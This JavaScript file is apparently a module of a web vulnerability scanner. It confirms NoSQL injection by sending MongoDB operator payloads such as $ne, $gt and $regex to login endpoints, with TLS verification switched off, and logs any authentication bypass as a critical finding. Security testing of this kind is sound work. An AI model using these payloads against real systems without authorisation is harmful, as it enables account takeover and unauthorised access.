const { BaseModule, ModuleResult } = require('./base');
const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');
const { endpointCandidates, postJson, dedupEndpoints } = require('./massassign_confirm');

// POST MongoDB-style operator objects to auth/query endpoints. If a payload the
// server would normally reject unlocks a success response, operators reach the
// query (NoSQL injection). A wrong-credentials baseline guards against FPs.
const PAYLOADS = [
  '{"user":"admin","pass":{"$ne":"wkNope"}}',
  '{"user":{"$ne":"wkNope"},"pass":{"$ne":"wkNope"}}',
  '{"user":"admin","pass":{"$gt":""}}',
  '{"user":{"$gt":""},"pass":{"$gt":""}}',
  '{"user":"admin","pass":{"$regex":".*"}}',
];
const SUCCESS = [/"ok"\s*:\s*true/i, /"token"\s*:/i, /"role"\s*:\s*"admin"/i, /"authenticated"\s*:\s*true/i, /"success"\s*:\s*true/i];

class NosqliConfirm extends BaseModule {
  static moduleName = 'nosqli_confirm';
  static phase = 'P6d';
  static toolsNeeded = [];

  async execute() {
    const candidates = endpointCandidates(this.workspace, this.scope, true);
    if (!candidates.length) return new ModuleResult({ module: NosqliConfirm.moduleName, status: 'skipped', errors: ['No candidate endpoints'] });
    const ua = this.config.user_agent || 'WebKiller/3.0';
    const confirmed = [];
    pushInsecureTLS();
    try {
      for (const ep of candidates.slice(0, this.config.nosqli_max_urls || 60)) {
        let baseOk;
        try { const baseText = await postJson(ep, '{"user":"wkNope","pass":"wkNope"}', ua); baseOk = SUCCESS.some(re => re.test(baseText)); } catch { continue; }
        if (baseOk) continue; // endpoint returns "success" even for wrong creds — not a usable oracle
        for (const pl of PAYLOADS) {
          try {
            const body = await postJson(ep, pl, ua);
            if (SUCCESS.some(re => re.test(body))) {
              confirmed.push({ name: 'NoSQL injection (auth bypass)', severity: 'critical', url: ep, evidence: { payload: pl, note: 'operator object bypassed authentication' }, type: 'dast_confirmed', vuln_class: 'nosqli', module: NosqliConfirm.moduleName });
              break;
            }
          } catch { /* skip */ }
        }
      }
    } finally { popInsecureTLS(); }
    const out = dedupEndpoints(confirmed);
    if (out.length) { this.workspace.appendJsonl('confirmed.jsonl', out); this.workspace.appendJsonl('findings.jsonl', out); }
    return new ModuleResult({ module: NosqliConfirm.moduleName, items: out.map(c => c.url), records: out, toolUsed: 'operator-injection' });
  }
}
module.exports = NosqliConfirm;
